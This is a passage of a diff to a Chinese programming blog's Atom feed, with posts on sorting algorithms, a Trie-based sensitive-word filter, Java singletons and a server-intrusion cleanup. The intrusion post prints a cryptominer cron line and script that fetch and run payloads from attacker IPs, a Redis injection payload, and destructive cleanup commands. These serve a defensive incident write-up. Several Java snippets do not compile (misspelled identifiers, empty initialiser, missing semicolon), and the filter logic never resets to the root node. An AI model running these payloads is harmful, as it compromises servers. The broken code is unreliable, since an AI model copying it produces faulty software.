class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;bucket.length; i++)&#123;</div><div class="line">            <span class="keyword">while</span>(bucket[i]--&gt;<span class="number">0</span>)&#123;</div><div class="line">                arr[index++] = min+i;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> java.util.*;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RadixSort</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] radixSort(<span class="keyword">int</span>[] arr) &#123;</div><div class="line">        <span class="keyword">if</span>(arr==<span class="keyword">null</span> || arr.length==<span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span> arr;</div><div class="line">         </div><div class="line">        <span class="keyword">int</span> [][]bucket =<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>][arr.length];</div><div class="line">        <span class="keyword">int</span> []len = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</div><div class="line">        <span class="keyword">int</span> p = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">1000</span>; i=i*<span class="number">10</span>)&#123;</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;arr.length; j++)&#123;</div><div class="line">                p = arr[j]/i%<span class="number">10</span>;</div><div class="line">                bucket[p][len[p]++] = arr[j];</div><div class="line">            &#125; </div><div class="line">            p = <span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;bucket.length; j++)&#123;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;len[j]; k++)&#123;</div><div class="line">                    arr[p++] = bucket[j][k];</div><div class="line">                    bucket[j][k] = <span class="number">0</span>;</div><div class="line">                &#125;</div><div class="line">                len[j] = <span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> arr;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;各排序算法实现原理和分类、对比&quot;&gt;&lt;a href=&quot;#各排序算法实现原理和分类、对比&quot; class=&quot;headerlink&quot; title=&quot;各排序算法实现原理和分类、对比&quot;&gt;&lt;/a&gt;各排序算法实现原理和分类、对比&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://o
+    
+    </summary>
+    
+    
+      <category term="数据结构和算法" scheme="http://jooop.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>java实现基于Trie树的敏感词过滤算法</title>
+    <link href="http://jooop.github.io/2017/04/20/java%E5%AE%9E%E7%8E%B0%E6%95%8F%E6%84%9F%E8%AF%8D%E8%BF%87%E6%BB%A4%E7%AE%97%E6%B3%95/"/>
+    <id>http://jooop.github.io/2017/04/20/java实现敏感词过滤算法/</id>
+    <published>2017-04-20T01:06:06.000Z</published>
+    <updated>2017-04-20T01:09:20.429Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h2><p>载入敏感词文件，构造敏感词trie树，对输入文本按照trie树的单个字符进行依次比对，若相等，则输入文本和树都向下一个字符移动，直到不相等时（为非敏感词，结束该处比对），或者直到相等时（为敏感词汇，对其进行替换）。从下一个字符开始与树从根处进行重复比对。</p>
+<p>进行一次过滤时间的复杂度：O(n)</p>
+<h2 id="图解流程"><a href="#图解流程" class="headerlink" title="图解流程"></a>图解流程</h2><h3 id="构造前缀树"><a href="#构造前缀树" class="headerlink" title="构造前缀树"></a>构造前缀树</h3><p><strong>敏感词：xy，ab，ac</strong><br><strong>待匹配字符：aacxd</strong></p>
+<ul>
+<li>初始化<br><img src="http://odl4eqqu9.bkt.clouddn.com/blog/sensitive/%E5%88%9D%E5%A7%8B%E5%8C%96%E7%8A%B6%E6%80%81.png" alt="Alt text"><h3 id="依次匹配"><a href="#依次匹配" class="headerlink" title="依次匹配"></a>依次匹配</h3></li>
+</ul>
+<ol>
+<li>从待匹配字符串中选取position指向的字符，去前缀树中查找，tempNode下子节点是否有该字符。有则将position+1，将tempNode指向该关键字。</li>
+</ol>
+<ul>
+<li><strong>例：positon指向开始的a，去root下查找，有子节点a，将position指向position+1，将tempNode指向a。</strong><br><img src="http://odl4eqqu9.bkt.clouddn.com/blog/sensitive/root%E4%B8%8B%E6%9C%89%EF%BC%8C%E5%B0%86position+1.png" alt="Alt text"></li>
+</ul>
+<ol>
+<li>重复上述步骤，从待匹配字符串中选取position指向的字符，去前缀树中查找，tempNode下子节点是否有该字符。没有则将position指向begin+1，之后begin指向begin+1，将tempNode重新指回root。</li>
+</ol>
+<ul>
+<li><strong>例：继续向下寻找，此时position为a，tempNode为a，tempNode下的子节点为c/d，子节点中不存在positon，因此将position和begin都指向begin+1,tempNode指回root。</strong><br><img src="http://odl4eqqu9.bkt.clouddn.com/blog/sensitive/%E9%87%8D%E7%BD%AE%E8%8A%82%E7%82%B9.png" alt="Alt text"></li>
+</ul>
+<ol>
+<li>继续向下匹配，情况如步骤1.</li>
+</ol>
+<ul>
+<li><strong>例：position为a，tempNode下有节点a，相同，tempNode指向a，position = position+1</strong><br><img src="http://odl4eqqu9.bkt.clouddn.com/blog/sensitive/%E5%86%8D%E6%AC%A1%E7%9B%B8%E7%AD%89.png" alt="Alt text"></li>
+</ul>
+<ol>
+<li>继续向下匹配，position和tempNode中的子节点相同时，并且该子节点为叶子结点，则匹配到敏感词，<strong>关键词为begin到position处的字符</strong>。将其替换，然后begin和position都指向position+1，tempNode重新指回root，对后续字符串依次匹配。</li>
+</ol>
+<ul>
+<li><strong>例：positon为c，tempNode的子节点中有c，并且为叶子结点，匹配到该关键词，对其进行处理。然后将tempNode指回root，begin和position指向position+1</strong><br><img src="http://odl4eqqu9.bkt.clouddn.com/blog/sensitive/%E5%8C%B9%E9%85%8D%E5%88%B0png" alt="Alt text"></li>
+</ul>
+<h2 id="定义trie树"><a href="#定义trie树" class="headerlink" title="定义trie树"></a>定义trie树</h2><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">TrieNode</span></span>&#123;</div><div class="line">	<span class="comment">//当前节点是否为词末</span></div><div class="line">	<span class="keyword">private</span> <span class="keyword">boolean</span> end = <span class="keyword">false</span>;</div><div class="line">	<span class="comment">//存放</span></div><div class="line">	Map&lt;Character,TrieNode&gt; subNode = <span class="keyword">new</span> HashMap&lt;&gt;();</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addNode</span><span class="params">(Character key,TrieNode node)</span></span>&#123;</div><div class="line">		subNode.put(key,node);</div><div class="line">	&#125;</div><div class="line">	<span class="function">TrieNode <span class="title">getsubNode</span><span class="params">(Character key)</span></span>&#123;</div><div class="line">		<span class="keyword">return</span> subNod.get(key);</div><div class="line">	&#125;</div><div class="line">	<span class="function"><span class="keyword">void</span> <span class="title">setKeywordEnd</span><span class="params">(<span class="keyword">boolean</span> end)</span></span>&#123;</div><div class="line">		<span class="keyword">this</span>.end = end;</div><div class="line">	&#125;</div><div class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isKeywordEnd</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">return</span> end;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="构造关键词前缀树"><a href="#构造关键词前缀树" class="headerlink" title="构造关键词前缀树"></a>构造关键词前缀树</h2><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">private</span> TrieNode root = <span class="keyword">new</span> TrieNode();</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addWord</span><span class="params">(String lineText)</span></span>&#123;</div><div class="line">	TrieNode tempNode = root;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=;i&lt;lineText.length();i++)&#123;</div><div class="line">		Character word = lineText.charAt(i);</div><div class="line">		TrieNode node = tempNode.getsubNode(word);</div><div class="line">		<span class="keyword">if</span> (node==<span class="keyword">null</span>)&#123;</div><div class="line">			node = <span class="keyword">new</span> TrieNode ();</div><div class="line">			tempNode.addNode(word,node);</div><div class="line">		&#125;</div><div class="line">		tempNode = node;</div><div class="line">		<span class="keyword">if</span> (i==lineText.length-<span class="number">1</span>)&#123;</div><div class="line">			tempNode.setKeywordEnd(<span class="keyword">true</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="实现过滤"><a href="#实现过滤" class="headerlink" title="实现过滤"></a>实现过滤</h2><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">filter</span><span class="params">(String text)</span></span>&#123;</div><div class="line">	<span class="keyword">if</span>(text==<span class="keyword">null</span>||String.length==<span class="number">0</span>)</div><div class="line">		<span class="keyword">return</span> text;</div><div class="line">	StringBuilder result = <span class="keyword">new</span> StringBuilder();</div><div class="line">	String replace = <span class="string">"**"</span>;</div><div class="line">	TrieNode tempNode = root;</div><div class="line">	<span class="keyword">int</span> begin = <span class="number">0</span>;</div><div class="line">	<span class="keyword">int</span> position = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span>(position&lt;text.length())&#123;</div><div class="line">		<span class="keyword">char</span> word = text.charAt(position);</div><div class="line">		tempNode = tempNode.getsubNode(word);</div><div class="line">		<span class="keyword">if</span> (tempNode == <span class="keyword">null</span>)&#123;</div><div class="line">			result.append(text.charAt(begin));</div><div class="line">			position = begin+<span class="number">1</span>;</div><div class="line">			begin = position;</div><div class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (tempNode.isKeywordEnd())&#123;</div><div class="line">			result.append(replace);</div><div class="line">			position = position+<span class="number">1</span>;</div><div class="line">			begin = position;</div><div class="line">			tempNode = root;</div><div class="line">		&#125; <span class="keyword">else</span>&#123;</div><div class="line">			position++;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	result.append(text.subString(begin));</div><div class="line">	<span class="keyword">return</span> result.toString();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="敏感词文件读取："><a href="#敏感词文件读取：" class="headerlink" title="敏感词文件读取："></a>敏感词文件读取：</h3><p>使用外部文件保存敏感词信息，在初始化时每取一个置入树结构中。</p>
+<h3 id="分隔符过滤："><a href="#分隔符过滤：" class="headerlink" title="分隔符过滤："></a>分隔符过滤：</h3><p>在实现过滤的过程中，对输入字符串的当前字符进行判别是否为东亚文字，根据当前tempNode位置是否指向root上决定是将该字符跳过还是替换。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;思想&quot;&gt;&lt;a href=&quot;#思想&quot; class=&quot;headerlink&quot; title=&quot;思想&quot;&gt;&lt;/a&gt;思想&lt;/h2&gt;&lt;p&gt;载入敏感词文件，构造敏感词trie树，对输入文本按照trie树的单个字符进行依次比对，若相等，则输入文本和树都向下一个字符移动，直到不相等时
+    
+    </summary>
+    
+    
+      <category term="数据结构和算法" scheme="http://jooop.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>记一次服务器被入侵排查清除经历</title>
+    <link href="http://jooop.github.io/2017/04/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%BB%8F%E5%8E%86/"/>
+    <id>http://jooop.github.io/2017/04/19/记一次服务器被入侵排查经历/</id>
+    <published>2017-04-19T01:34:59.000Z</published>
+    <updated>2017-04-19T02:09:30.039Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>昨晚凌晨三点突然收到阿里云的提示邮件，说我的服务器存在恶意发包行为，打开手机端阿里云控制台中ECS各项数组都满载，因为当时不便使用电脑，且服务器中并没有较为重要的服务，所以第一时间选择了关闭服务器。<br>今天打开服务器后排查，查看crontab任务，发现自己之前的任务被删除，并修改为<code>*/5 * * * * curl -fsSL http://218.38.3.16:9999/i.sh?8 | sh</code><br>其中脚本内容如下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/usr/sbin</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://218.38.3.16:9999/i.sh?8 | sh"</span> &gt; /var/spool/cron/root</div><div class="line">mkdir -p /var/spool/cron/crontabs</div><div class="line"><span class="built_in">echo</span> <span class="string">"*/5 * * * * curl -fsSL http://218.38.3.16:9999/i.sh?8 | sh"</span> &gt; /var/spool/cron/crontabs/root</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="string">"/tmp/ddg.1007"</span> ]; <span class="keyword">then</span></div><div class="line">    curl -fsSL http://218.38.3.16:9999/1007/ddg.$(uname -m) -o /tmp/ddg.1007</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/ddg.1007 &amp;&amp; /tmp/ddg.1007</div></pre></td></tr></table></figure></p>
+<h2 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h2><p>查了下此为挖矿程序，多数是由于redis未授权漏洞导致的，想了下两天前安装过redis，并且为了远程使用确实打开了远程登录，去redis下查看keys，发现果然多了一条”wgnnjlkona”,其value为<code>&quot;\n\n*/1 * * * * curl -fsSL  http://104.156.239.160:8081/conn.sh | sh \n\n&quot;</code></p>
+<h2 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h2><ul>
+<li>删除该key。并修改配置文件，关闭redis远程访问服务(或设置密码)。</li>
+<li>删除crontab中的任务。</li>
+<li>关闭访问挖矿服务器的访问：<code>iptables -A INPUT -s xmr.crypto-pool.fr -j DROP</code> 和 <code>iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</code></li>
+<li>执行常见木马清理命令<code>chattr -i /usr/bin/.sshd; rm -f /usr/bin/.sshd; chattr -i /usr/bin/.swhd; rm -f /usr/bin/.swhd; rm -f -r /usr/bin/bsd-port; cp /usr/bin/dpkgd/ps /bin/ps; cp /usr/bin/dpkgd/netstat /bin/netstat; cp /usr/bin/dpkgd/lsof /usr/sbin/lsof; cp /usr/bin/dpkgd/ss /usr/sbin/ss;rm -r -f /root/.ssh; rm -r -f /usr/bin/bsd-port;find /proc/ -name exe | xargs ls -l | grep -v task |grep deleted| awk &#39;{print $11}&#39; | awk -F/ &#39;{print $NF}&#39; | xargs killall -9;</code></li>
+<li>去tmp目录下删除相应的<code>ddg.1007</code>、<code>wnTKYg</code>、<code>dump.rdb</code>、<code>root</code>、<code>Aegis-&lt;Guid(5A2C30A2-A87D-490A-9281-6765EDAD7CBA)&gt;</code>等文件。</li>
+<li>去root目录查看所有文件，删除可疑的文件和文件夹包括<code>/.ssh</code>和<code>/.ddg</code></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;问题&quot;&gt;&lt;a href=&quot;#问题&quot; class=&quot;headerlink&quot; title=&quot;问题&quot;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;昨晚凌晨三点突然收到阿里云的提示邮件，说我的服务器存在恶意发包行为，打开手机端阿里云控制台中ECS各项数组都满载，因为当时不便使用电脑，且服
+    
+    </summary>
+    
+    
+      <category term="Linux" scheme="http://jooop.github.io/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>5种JAVA单例模式的实现、原理和演化</title>
+    <link href="http://jooop.github.io/2017/04/07/5%E7%A7%8DJAVA%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%81%E5%8E%9F%E7%90%86%E5%92%8C%E6%BC%94%E5%8C%96/"/>
+    <id>http://jooop.github.io/2017/04/07/5种JAVA单例模式的实现、原理和演化/</id>
+    <published>2017-04-07T02:35:21.000Z</published>
+    <updated>2017-04-07T02:38:16.126Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p><strong>最近一直在深入学习并理解之前学过的JAVA 集合、多线程、MySQL、框架原理等相关内容基础的原理和实现，以及对这些知识的总结归纳，不过在深入的过程发现许多自认为掌握了的东西，其实在实现的细节和原理方面的掌握还是有些不足。</strong><br><strong>许多东西第一次看的时候理解了，也自认为掌握了，但过段时间回忆起来还是有些出入，而想要再次查阅书籍、他人博客的时候不免要经过一些其他信息的干扰，故而觉得还是很有必要根据自己的理解整理、将自己的见解记录下来，既方便自己、可能也会对他人有所帮助。</strong></p>
+<h2 id="一、单例模式三要素"><a href="#一、单例模式三要素" class="headerlink" title="一、单例模式三要素"></a>一、单例模式三要素</h2><ul>
+<li>私有的构造方法；</li>
+<li>指向自己实例的私有静态引用；</li>
+<li>以自己实例为返回值的静态的公有方法。</li>
+</ul>
+<h2 id="二、懒汉式（实现方式的演化）"><a href="#二、懒汉式（实现方式的演化）" class="headerlink" title="二、懒汉式（实现方式的演化）"></a>二、懒汉式（实现方式的演化）</h2><p>之所以用2个版本依次推进来讲解懒汉式的实现，是希望能够在学习的过程中对其具体实现的细节和原理可以有更深入、深刻的理解。<br>所谓懒汉式，即在需要调用单例的对象时才进行对象创建。</p>
+<h3 id="1、线程不安全版本"><a href="#1、线程不安全版本" class="headerlink" title="1、线程不安全版本"></a>1、线程不安全版本</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;</div><div class="line">    </div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</div><div class="line">            instance = <span class="keyword">new</span> Singleton();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> instance;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>线程不安全的原因：<br>会出现一种情况：首先A线程执行<code>if(instance==null)</code>发现没有对象存在，于是进入if中，然而在还未执行<code>instance = new Singleton()</code>时线程被挂起，此时B线程也执行并进入if中，创建了对象，再轮到A线程执行时会再次创建另外一个对象。此时导致单例失效。</p>
+<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>测试用例：<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">":"</span>+Singleton.getInstance());</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</div><div class="line">            Main test = <span class="keyword">new</span> Main();</div><div class="line">            <span class="keyword">new</span> Thread(test,<span class="string">"线程"</span>+i).start();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>线程不安全输出结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">线程0:Singleton.Singleton@1dda492b</div><div class="line">线程1:Singleton.Singleton@7fc089c2</div></pre></td></tr></table></figure></p>
+<p>随手试了下，线程不安全的情况挺容易发生的，（没有重写toString方法，因此直接输出的hashCode），可以看到两个线程得到的对象并不是同一个。</p>
+<h3 id="2、同步锁synchrodized保证线程安全、但效率低"><a href="#2、同步锁synchrodized保证线程安全、但效率低" class="headerlink" title="2、同步锁synchrodized保证线程安全、但效率低"></a>2、同步锁synchrodized保证线程安全、但效率低</h3><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;</div><div class="line">    </div><div class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</div><div class="line">    </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</div><div class="line">            instance = <span class="keyword">new</span> Singleton();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> instance;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>此版本在获取对象的方法上使用了同步锁来保证了线程安全，但是效率较低。因为同步操作只有在第一次调用时才需要，但是在<code>getInstance()</code>方法上加锁以后导致每次获取该对象都要进行同步处理，此时其他线程需要等待，所以效率低。</p>
+<h2 id="三、双重检验锁"><a href="#三、双重检验锁" class="headerlink" title="三、双重检验锁"></a>三、双重检验锁</h2><h3 id="对懒汉式的线程安全版本进行优化（非线程安全）"><a href="#对懒汉式的线程安全版本进行优化（非线程安全）" class="headerlink" title="对懒汉式的线程安全版本进行优化（非线程安全）"></a>对懒汉式的线程安全版本进行优化（非线程安全）</h3><p>双重检验锁其实也是基于懒汉式的，是对其线程安全版本的优化处理。<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;</div><div class="line"></div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</div><div class="line">	</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</div><div class="line">			<span class="keyword">synchronized</span>(Singleton.class)&#123;</div><div class="line">				<span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</div><div class="line">					instance = <span class="keyword">new</span> Singleton();</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> instance;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>双重检验锁和直接使用synchronized来锁住getInstance方法的懒汉式相比，主要优化之处在于减小了锁的粒度。<br><strong>第一重校验的作用</strong>：先判断实例有没有创建，如没有创建才进行同步代码块的执行去创建对象。这样保证了之后的使用的效率。<br><strong>第二重校验的作用</strong>：在同步代码块内部再次进行对象是否已经创建的校验主要是为了防止多个线程进入第一个if中，而后都会执行同步代码块导致的重复创建对象的情况。</p>
+<h3 id="JVM指令重排序导致的潜在的问题和解决（线程安全）"><a href="#JVM指令重排序导致的潜在的问题和解决（线程安全）" class="headerlink" title="JVM指令重排序导致的潜在的问题和解决（线程安全）"></a>JVM指令重排序导致的潜在的问题和解决（线程安全）</h3><p>上面的优化版本虽然看起来很好地同时解决了线程安全问题和效率问题，但<strong>其并不是线程安全的</strong>。<br><strong>问题：</strong>主要问题在于JVM的<code>“优化指令重排”</code>机制。以及<code>instance = new Singleton();</code>并非原子性操作。<br><code>instance = new Singleton();</code>的过程如下：<br>1、在堆上开辟一块内存空间<br>2、对对象进行设置、初始化<br>3、返回对象引用到栈中<br>而在JVM中的优化指令重排序可能会导致其原本的1、2、3执行顺序变为1、3、2。此时若当A线程执行了1、3挂起后，B线程调用了<code>getInstance()</code>，会判断<code>instance!=null</code>，从而将实际上未初始化完成的instance返回，导致调用该对象出错。<br><strong>解决：</strong>自JDK1.5之后的关键字volatile会给所修饰的对象有两个特性：1、确保所有线程看到这个变量的值是一致。2、禁止优化指令重排序。<br>此处主要用到禁止优化指令重排的效果，其原理是在字节码层面上，在volatile修饰的变量的赋值语句后面会有一个内存屏障，读操作不会被优化重排到内存屏障之前，内次不会发生执行顺序变成1、3、2的情况。<br><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;</div><div class="line"></div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</div><div class="line">			<span class="keyword">synchronized</span>(Singleton.class)&#123;</div><div class="line">				<span class="keyword">if</span>(instance==<span class="keyword">null</span>)&#123;</div><div class="line">					instance = <span class="keyword">new</span> Singleton;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> instance;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="四、饿汉式"><a href="#四、饿汉式" class="headerlink" title="四、饿汉式"></a>四、饿汉式</h2><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;</div><div class="line"></div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">return</span> instance</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>饿汉式和懒汉式相比主要区别在于单例对象在类加载时就被初始化，即使没有调用过getInstance方法。因此即使不加锁也不存在线程安全问题，是天生线程安全的。<br>不过饿汉式并不能适应所有的使用情况，当Singleton创建的对象需要依赖参数或者配置文件，在创建instance对象前需要调用某个方法对其设置参数的情况无法实现。</p>
+<h2 id="五、静态内部类实现"><a href="#五、静态内部类实现" class="headerlink" title="五、静态内部类实现"></a>五、静态内部类实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</div><div class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;</div><div class="line"></div><div class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span></span>&#123;</div><div class="line">		<span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</div><div class="line">		<span class="keyword">return</span> SingletonHolder.instance;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>静态内部类实际上也是懒汉式的一种实现方式。其线程安全，没有性能缺陷，且不依赖JDK版本。<br>原理：静态内部类只有在调用getInstance()方法时才加载，从而实例化instance，而且只加载一次。</p>
+<h2 id="六、枚举实现"><a href="#六、枚举实现" class="headerlink" title="六、枚举实现"></a>六、枚举实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">enum</span> Singleton&#123;</div><div class="line">    INSTANCE;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whateverMethod</span><span class="params">()</span></span>&#123;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>枚举实现方法是最简单的一种，也是《effective java》中推荐的一种写法，其原理大致是因为JDK1.5之后的枚举数据都是线程安全的。<br>不过个人对枚举类使用和了解都不够深入， 其具体细节和原理有待以后补充。</p>
+]]></content>
+    
+    <summary type="html">
+    
